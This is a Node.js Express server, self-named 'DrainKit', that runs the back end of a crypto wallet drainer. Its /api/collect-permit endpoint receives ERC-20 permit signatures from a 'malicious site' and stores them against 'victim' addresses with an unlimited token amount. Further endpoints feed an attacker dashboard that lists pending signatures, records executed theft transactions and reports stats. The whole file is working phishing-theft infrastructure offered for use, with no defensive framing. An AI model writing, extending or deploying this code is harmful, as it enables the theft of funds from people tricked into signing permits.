import express from 'express';
import cors from 'cors';
import mongoose from 'mongoose';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;
const MONGODB_URI = process.env.MONGODB_URI;

app.use(cors());
app.use(express.json());

// In-memory fallback storage
let inMemorySignatures = [];
let useInMemory = false;

// MongoDB Schema
const signatureSchema = new mongoose.Schema({
  chainId: { type: Number, required: true, index: true },
  token: { type: String, required: true, lowercase: true },
  victim: { type: String, required: true, lowercase: true, index: true },
  amount: { type: String, required: true },
  deadline: { type: Number, required: true, index: true },
  v: { type: Number, required: true },
  r: { type: String, required: true },
  s: { type: String, required: true },
  status: { type: String, enum: ['pending', 'executed', 'failed'], default: 'pending', index: true },
  txHash: { type: String, default: null },
  createdAt: { type: Date, default: Date.now, index: true },
  executedAt: { type: Date, default: null }
});

const Signature = mongoose.model('Signature', signatureSchema);

// Connect to MongoDB (with fallback to in-memory)
if (MONGODB_URI && MONGODB_URI.includes('mongodb')) {
  mongoose.connect(MONGODB_URI, { 
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 5000,
    connectTimeoutMS: 5000
  })
    .then(() => {
      console.log('✅ Connected to MongoDB');
      useInMemory = false;
    })
    .catch(err => {
      console.warn('⚠️  MongoDB connection failed, using in-memory storage');
      console.warn('   Error:', err.message);
      useInMemory = true;
    });
} else {
  console.warn('⚠️  No MongoDB URI configured, using in-memory storage');
  useInMemory = true;
}

// Collect permit signature from malicious site
app.post('/api/collect-permit', async (req, res) => {
  try {
    const { chainId, token, victim, deadline, v, r, s } = req.body;
    
    if (!chainId || !token || !victim || !deadline || !v || !r || !s) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    if (useInMemory) {
      // In-memory storage
      const id = `${chainId}-${victim}-${token}-${Date.now()}`;
      const signature = {
        id,
        chainId: Number(chainId),
        token: token.toLowerCase(),
        victim: victim.toLowerCase(),
        amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
        deadline: Number(deadline),
        v: Number(v),
        r,
        s,
        status: 'pending',
        timestamp: Date.now()
      };
      
      inMemorySignatures.push(signature);
      console.log(`✅ Permit signature collected (in-memory): ${victim}`);
      return res.json({ success: true, id });
    }

    // MongoDB storage
    const existing = await Signature.findOne({
      chainId: Number(chainId),
      token: token.toLowerCase(),
      victim: victim.toLowerCase(),
      deadline: Number(deadline)
    });

    if (existing) {
      return res.json({ success: true, id: existing._id, duplicate: true });
    }

    const signature = new Signature({
      chainId: Number(chainId),
      token: token.toLowerCase(),
      victim: victim.toLowerCase(),
      amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
      deadline: Number(deadline),
      v: Number(v),
      r,
      s,
      status: 'pending'
    });

    await signature.save();
    
    console.log('✅ Permit signature collected:');
    console.log(`   ID: ${signature._id}`);
    console.log(`   Victim: ${victim}`);
    console.log(`   Token: ${token}`);
    
    res.json({ success: true, id: signature._id });
  } catch (error) {
    console.error('Error collecting signature:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get all pending signatures (for dashboard)
app.get('/api/signatures', async (req, res) => {
  try {
    if (useInMemory) {
      const pending = inMemorySignatures.filter(s => s.status === 'pending');
      return res.json(pending);
    }

    const { chainId, status = 'pending' } = req.query;
    
    const query = { status };
    if (chainId) query.chainId = Number(chainId);
    
    const signatures = await Signature.find(query)
      .sort({ createdAt: -1 })
      .limit(100)
      .lean();
    
    const formatted = signatures.map(sig => ({
      id: sig._id.toString(),
      chainId: sig.chainId,
      token: sig.token,
      victim: sig.victim,
      amount: sig.amount,
      deadline: sig.deadline,
      v: sig.v,
      r: sig.r,
      s: sig.s,
      timestamp: sig.createdAt.getTime()
    }));
    
    res.json(formatted);
  } catch (error) {
    console.error('Error fetching signatures:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Mark signature as executed
app.post('/api/signatures/:id/executed', async (req, res) => {
  try {
    const { txHash } = req.body;
    
    if (useInMemory) {
      const sig = inMemorySignatures.find(s => s.id === req.params.id);
      if (sig) {
        sig.status = 'executed';
        sig.txHash = txHash;
        console.log(`✅ Signature ${req.params.id} marked as executed`);
        return res.json({ success: true });
      }
      return res.status(404).json({ error: 'Signature not found' });
    }

    const signature = await Signature.findByIdAndUpdate(
      req.params.id,
      { 
        status: 'executed',
        executedAt: new Date(),
        txHash: txHash || null
      },
      { new: true }
    );
    
    if (signature) {
      console.log(`✅ Signature ${req.params.id} marked as executed`);
      if (txHash) console.log(`   TX: ${txHash}`);
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Signature not found' });
    }
  } catch (error) {
    console.error('Error updating signature:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Mark signature as failed
app.post('/api/signatures/:id/failed', async (req, res) => {
  try {
    const { error: errorMsg } = req.body;
    
    if (useInMemory) {
      const sig = inMemorySignatures.find(s => s.id === req.params.id);
      if (sig) {
        sig.status = 'failed';
        console.log(`❌ Signature ${req.params.id} marked as failed`);
        return res.json({ success: true });
      }
      return res.status(404).json({ error: 'Signature not found' });
    }

    const signature = await Signature.findByIdAndUpdate(
      req.params.id,
      { 
        status: 'failed',
        executedAt: new Date(),
        txHash: errorMsg || null
      },
      { new: true }
    );
    
    if (signature) {
      console.log(`❌ Signature ${req.params.id} marked as failed`);
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Signature not found' });
    }
  } catch (error) {
    console.error('Error updating signature:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Delete signature
app.delete('/api/signatures/:id', async (req, res) => {
  try {
    if (useInMemory) {
      const index = inMemorySignatures.findIndex(s => s.id === req.params.id);
      if (index !== -1) {
        inMemorySignatures.splice(index, 1);
        console.log(`🗑️  Signature ${req.params.id} deleted`);
        return res.json({ success: true });
      }
      return res.status(404).json({ error: 'Signature not found' });
    }

    const signature = await Signature.findByIdAndDelete(req.params.id);
    
    if (signature) {
      console.log(`🗑️  Signature ${req.params.id} deleted`);
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Signature not found' });
    }
  } catch (error) {
    console.error('Error deleting signature:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get statistics
app.get('/api/stats', async (req, res) => {
  try {
    if (useInMemory) {
      const total = inMemorySignatures.length;
      const pending = inMemorySignatures.filter(s => s.status === 'pending').length;
      const executed = inMemorySignatures.filter(s => s.status === 'executed').length;
      const failed = inMemorySignatures.filter(s => s.status === 'failed').length;
      
      return res.json({
        total,
        pending,
        executed,
        failed,
        recent: inMemorySignatures.slice(0, 10).map(s => ({
          id: s.id,
          chainId: s.chainId,
          victim: s.victim,
          status: s.status,
          timestamp: s.timestamp
        }))
      });
    }

    const [total, pending, executed, failed] = await Promise.all([
      Signature.countDocuments(),
      Signature.countDocuments({ status: 'pending' }),
      Signature.countDocuments({ status: 'executed' }),
      Signature.countDocuments({ status: 'failed' })
    ]);
    
    const recent = await Signature.find()
      .sort({ createdAt: -1 })
      .limit(10)
      .select('chainId victim status createdAt')
      .lean();
    
    res.json({
      total,
      pending,
      executed,
      failed,
      recent: recent.map(r => ({
        id: r._id.toString(),
        chainId: r.chainId,
        victim: r.victim,
        status: r.status,
        timestamp: r.createdAt.getTime()
      }))
    });
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check
app.get('/health', async (req, res) => {
  try {
    if (useInMemory) {
      return res.json({
        status: 'ok',
        database: 'in-memory',
        signatures: inMemorySignatures.length,
        pending: inMemorySignatures.filter(s => s.status === 'pending').length
      });
    }

    const dbStatus = mongoose.connection.readyState === 1 ? 'connected' : 'disconnected';
    const [total, pending] = await Promise.all([
      Signature.countDocuments(),
      Signature.countDocuments({ status: 'pending' })
    ]);
    
    res.json({ 
      status: 'ok',
      database: dbStatus,
      signatures: total,
      pending
    });
  } catch (error) {
    res.status(500).json({ 
      status: 'error',
      database: 'error',
      error: error.message
    });
  }
});

// Cleanup old signatures (only for MongoDB)
const cleanupOldSignatures = async () => {
  if (useInMemory) return;
  
  try {
    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    const result = await Signature.deleteMany({
      status: { $in: ['executed', 'failed'] },
      executedAt: { $lt: sevenDaysAgo }
    });
    if (result.deletedCount > 0) {
      console.log(`🧹 Cleaned up ${result.deletedCount} old signatures`);
    }
  } catch (error) {
    console.error('Error cleaning up signatures:', error);
  }
};

// Run cleanup every 24 hours
setInterval(cleanupOldSignatures, 24 * 60 * 60 * 1000);

app.listen(PORT, () => {
  console.log('🚀 DrainKit Backend Server');
  console.log(`📡 Listening on http://localhost:${PORT}`);
  console.log(`💾 Storage: ${useInMemory ? 'In-Memory (no persistence)' : 'MongoDB (persistent)'}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`   POST   /api/collect-permit           - Collect permit signatures`);
  console.log(`   GET    /api/signatures               - Get pending signatures`);
  console.log(`   POST   /api/signatures/:id/executed  - Mark as executed`);
  console.log(`   POST   /api/signatures/:id/failed    - Mark as failed`);
  console.log(`   DELETE /api/signatures/:id           - Delete signature`);
  console.log(`   GET    /api/stats                    - Get statistics`);
  console.log(`   GET    /health                       - Health check`);
  console.log('');
});
